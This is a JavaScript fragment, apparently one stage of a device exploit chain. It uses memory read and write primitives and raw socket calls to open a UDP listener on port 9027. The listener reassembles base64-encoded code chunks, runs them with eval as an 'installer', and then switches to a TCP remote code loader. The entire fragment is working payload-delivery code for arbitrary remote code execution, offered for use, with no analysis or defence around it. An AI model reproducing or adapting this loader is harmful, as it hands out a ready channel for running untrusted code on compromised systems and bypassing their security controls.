        // ==== UDP payload channel (LDN, fully offline) ====
        // Safe bulk read: one read64 per 8 bytes (read8 does a full read64 anyway).
        function fast_str(addr, len) {
            const codes = new Array(len);
            let i = 0;
            for (; i + 8 <= len; i += 8) {
                const v = read64(addr + BigInt(i));
                codes[i]     = Number(v & 0xffn);
                codes[i + 1] = Number((v >> 8n) & 0xffn);
                codes[i + 2] = Number((v >> 16n) & 0xffn);
                codes[i + 3] = Number((v >> 24n) & 0xffn);
                codes[i + 4] = Number((v >> 32n) & 0xffn);
                codes[i + 5] = Number((v >> 40n) & 0xffn);
                codes[i + 6] = Number((v >> 48n) & 0xffn);
                codes[i + 7] = Number((v >> 56n) & 0xffn);
            }
            for (; i < len; i++) codes[i] = Number(read8(addr + BigInt(i)));
            let s = "";
            for (let k = 0; k < len; k += 4096)
                s += String.fromCharCode.apply(null, codes.slice(k, k + 4096));
            return s;
        }

        function b64d(s) {
            const A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            const m = {};
            for (let i = 0; i < 64; i++) m[A[i]] = i;
            const o = [];
            let i = 0;
            while (i + 3 < s.length) {
                const c0 = m[s[i]], c1 = m[s[i+1]];
                const p2 = s[i+2] === "=", p3 = s[i+3] === "=";
                const c2 = p2 ? 0 : m[s[i+2]], c3 = p3 ? 0 : m[s[i+3]];
                const v = (c0 << 18) | (c1 << 12) | (c2 << 6) | c3;
                o.push((v >> 16) & 255);
                if (!p2) o.push((v >> 8) & 255);
                if (!p2 && !p3) o.push(v & 255);
                i += 4;
            }
            let r = "";
            for (let k = 0; k < o.length; k++) r += String.fromCharCode(o[k]);
            return r;
        }

        async function core_udp_loader() {
            const UD = 9027;
            const fd = socket(AF_INET, SOCK_DGRAM, 0);
            if (fd === -1n) { await log("udp socket failed"); return; }
            const rcvbuf = malloc(4);
            write32(rcvbuf, 512 * 1024);
            setsockopt(fd, SOL_SOCKET, 0x1002, rcvbuf, 4);   /* SO_RCVBUF */
            for (let i = 0; i < 16; i++) write8(sockaddr_in + BigInt(i), 0);
            write8(sockaddr_in, 16n);
            write8(sockaddr_in + 1n, 2n);
            write16(sockaddr_in + 2n, BigInt(((UD & 0xff) << 8) | (UD >> 8)));
            write32(sockaddr_in + 4n, 0n);
            if (bind(fd, sockaddr_in, 16) === -1n) { await log("udp bind failed"); return; }
            await log("UDP PAYLOAD CHANNEL :9027");

            const buf = malloc(2048);
            const tpl = [], js = [];
            let needT = 0, needJ = 0, rx = 0;
            for (;;) {
                const n = Number(recv(fd, buf, 2048, 0));
                if (n <= 0) continue;
                rx++;
                let s;
                try { s = fast_str(buf, n); } catch (e) { s = ""; }
                if (!s) continue;
                try {
                    const c = s[0], p = s.indexOf(':');
                    if (c === 'T') { tpl[+s.slice(1, p)] = s.slice(p + 1); }
                    else if (c === 'J') { js[+s.slice(1, p)] = s.slice(p + 1); }
                    else if (c === 'A') { needT = +s.slice(1, p); needJ = +s.slice(p + 1);
                        await log("UDP header tpl=" + needT + " js=" + needJ); }
                    else if (c === 'G') {
                        let missT = [], missJ = [];
                        for (let i = 0; i < needT; i++) if (!tpl[i]) missT.push(i);
                        for (let i = 0; i < needJ; i++) if (!js[i]) missJ.push(i);
                        if (missT.length || missJ.length || !needT) {
                            await log("UDP incomplete rx=" + rx + " missT=" + missT.length +
                                      (missT.length ? "[" + missT.slice(0, 10).join(",") + "]" : "") +
                                      " missJ=" + missJ.length +
                                      (missJ.length ? "[" + missJ.slice(0, 10).join(",") + "]" : ""));
                            continue;
                        }
                        window.__tpl = tpl.slice(0, needT);
                        const src = b64d(js.slice(0, needJ).join(""));
                        await log("RUNNING INSTALLER (" + src.length + " bytes)");
                        try { await eval(src); } catch (e) { await log("E: " + e.message); await log(e.stack); }
                        await log("INSTALLER RETURNED");
                        await log("leaving ldn network.");
                        await log("switching to TCP loader :9026");
                        await remote_js_loader();
                    }
                } catch (e) { await log("udp rx: " + e.message); }
            }
        }
        core_udp_loader();
